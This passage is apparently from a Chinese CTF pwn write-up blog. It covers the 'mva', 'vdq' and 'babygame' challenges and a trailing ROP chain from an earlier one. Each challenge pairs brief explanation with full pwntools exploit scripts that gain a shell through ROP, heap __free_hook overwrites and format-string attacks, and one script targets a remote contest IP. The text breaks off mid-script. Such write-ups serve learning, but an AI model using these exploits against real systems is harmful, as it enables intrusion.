+= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A + B <span class="hljs-keyword">or</span> count &gt; A + B:<br>                guessli.remove(item)<br>    <span class="hljs-keyword">if</span> A &gt; <span class="hljs-number">0</span>:<br>        guesslie = guessli.copy()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> guesslie:<br>            count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">0</span>] == item[<span class="hljs-number">0</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">1</span>] == item[<span class="hljs-number">1</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">2</span>] == item[<span class="hljs-number">2</span>] :<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> guess[<span class="hljs-number">3</span>] == item[<span class="hljs-number">3</span>]:<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> count &lt; A:<br>                guessli.remove(item)<br><br>sh.sendline(<span class="hljs-string">b&#x27;EXIT&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;(4) EXIT\n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>pop_rax_ret = <span class="hljs-number">0x405b78</span><br>pop_rdx_ret = <span class="hljs-number">0x48546c</span><br>mov_rdi_rax_ret = <span class="hljs-number">0x45beb8</span><br>xchg_rsi_rax_ret = <span class="hljs-number">0x45b327</span><br>syscall_ret = <span class="hljs-number">0x45c849</span><br>payload = <span class="hljs-string">b&#x27;0&#x27;</span> * <span class="hljs-number">0x460</span><br>payload += flat(<br>    pop_rax_ret, <span class="hljs-number">0x68732f6e69622f</span>,<br>    mov_rdi_rax_ret,<br>    pop_rax_ret, <span class="hljs-number">0</span>,<br>    xchg_rsi_rax_ret,<br>    pop_rdx_ret, <span class="hljs-number">0</span>,<br>    pop_rax_ret, <span class="hljs-number">0x3b</span>,<br>    syscall_ret<br>)<br>sh.sendlineafter(<span class="hljs-string">b&#x27;SURE?&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># sh.sendlineafter(b&#x27;BYE~&#x27;, b&#x27;a&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h3><p>一个vmpwn题，每4个字节为一个指令，最后也很容易找到这个数组的负数溢出</p><img src="/img/15/Screenshot 2023-07-10 143827.png" style="zoom:80%;" /><p>利用这个漏洞可以改掉pop操作中的数组索引，实现栈上的数据任意读，读取<code>__libc_start_main</code>函数，利用加减运算可以改为one_gadget，但是push操作对索引限制了大小 ，当时自己并没有想到合适方法来实现栈上的数据任意写，看了其他师傅的wp才恍然大悟，push中有<code>mov  [rbp+rax*2+var_210], dx</code>，利用rax*2的负数溢出即可绕过索引的限制。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;mva&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./mva&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">s1, val</span>):<br>    code = p8(<span class="hljs-number">1</span>) + p8(s1) + p8(val &gt;&gt; <span class="hljs-number">8</span>) + p8(val &amp; <span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">2</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">s1, s2, s3</span>):<br>    code = p8(<span class="hljs-number">3</span>) + p8(s1) + p8(s2) + p8(s3)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">s1, s2</span>):<br>    code = p8(<span class="hljs-number">0xe</span>) + p8(s1) + p8(s2) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>():<br>    code = p8(<span class="hljs-number">0x9</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">s1</span>):<br>    code = p8(<span class="hljs-number">0xa</span>) + p8(s1) + p8(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> code<br><br>payload = mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10e</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += pop(<span class="hljs-number">1</span>) + pop(<span class="hljs-number">2</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x582</span>) + sub(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0xc</span>) + add(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x10c</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf6</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf7</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf8</span>)<br>payload += mov(<span class="hljs-number">0</span>, <span class="hljs-number">0x8000</span>) + load(<span class="hljs-number">0</span>, <span class="hljs-number">0xf9</span>)<br>payload += load(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>) + push() + load(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) + push()<br><br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="vdq"><a href="#vdq" class="headerlink" title="vdq"></a>vdq</h3><p>又是一道rust的题，流程倒是很简单，get_opr_lst函数中有个<code>serde_json::from_str</code>的反序列化操作，如果反序列化的结果错误是会直接退出的，自己当时为了搞清楚rust的反序列化还专门编译一个程序，再去用该程序在ida中分析。</p><p>当时的测试的代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">i32</span><br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">point</span> = Person &#123;name:<span class="hljs-string">&quot;aaaaa&quot;</span>.<span class="hljs-title function_ invoke__">to_owned</span>(), age:<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;point).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">point1</span>: Person = serde_json::<span class="hljs-title function_ invoke__">from_str</span>(&amp;json).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, point1);<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                       </p><p>回到本题上去，要求反序列化的结果是一个<code>Vec&lt;vdq::Operation&gt;</code>，vdq::Operation是一个枚举类型：</p><img src="/img/15/Screenshot 2023-07-06 162332.png" style="zoom:80%;" /><p>搞清楚以后，最后测试一下序列化会变成字符串是什么内容：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Operation</span>&#123;<br>    Add,<br>    Remove,<br>    Append,<br>    Archive,<br>    View<br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span>:<span class="hljs-type">Vec</span>&lt;Operation&gt; = <span class="hljs-built_in">vec!</span>[Operation::Add, Operation::Remove];<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span>:<span class="hljs-type">String</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;v).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                       </p><p><code>vdq::handle_opr_lst</code>函数就是将反序列化的结果变成一个个类似于堆菜单的操作，自己当时完全没有发现任何漏洞，直接看其他师傅的文章后才知道还能直接用python写一个fuzz脚本直接将漏洞找出来，具体细节就直接看本文开头推荐的文章吧，自己复现时被rust的堆分配快折磨疯了。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vdq&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./vdq&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>json_string = <span class="hljs-string">&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;,&#x27;</span><br>json_string += <span class="hljs-string">&#x27;&quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Append&quot;&#x27;</span><br>json_string += <span class="hljs-string">&#x27;]&#x27;</span><br><span class="hljs-comment">#json_string = &#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Add&quot;]&#x27;</span><br><span class="hljs-comment"># json_string = b&#x27;&#x27;&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Archive&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Append&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Archive&quot;, &quot;Add&quot;]&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;!&#x27;</span>, json_string)<br>p.sendline(<span class="hljs-string">b&#x27;$&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27; -&gt; &#x27;</span>)<br>leak = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    leak += (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>))<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">96</span><br>libc.address = libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">7</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x12</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) + p64(<span class="hljs-number">0</span>))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>唯一一个自己成功写出来的题。</p><p>这里的变量v5可以直接被后面的溢出覆盖，让接下来的游戏中的随机数变成伪随机数</p><img src="/img/15/Screenshot 2023-07-10 173013.png" style="zoom: 80%;" /><p>顺利通过游戏后就有一个格式化字符串漏洞，但只有一次，泄漏出相关信息后还要改变返回地址，所以需要栈上的一些与返回地址距离比较近的栈值去修改，当然这有1&#x2F;16的机率修改成功</p><img src="/img/15/Screenshot 2023-07-10 164617.jpg" style="zoom:80%;" /><p>修改返回值为0x153E，再次使用格式化字符串漏洞，利用之前泄漏的信息去改变返回地址为主函数，利用栈溢出直接ROP。</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babygame&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./babygame&#x27;, aslr=False)</span><br>p = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>,<span class="hljs-number">49378</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span 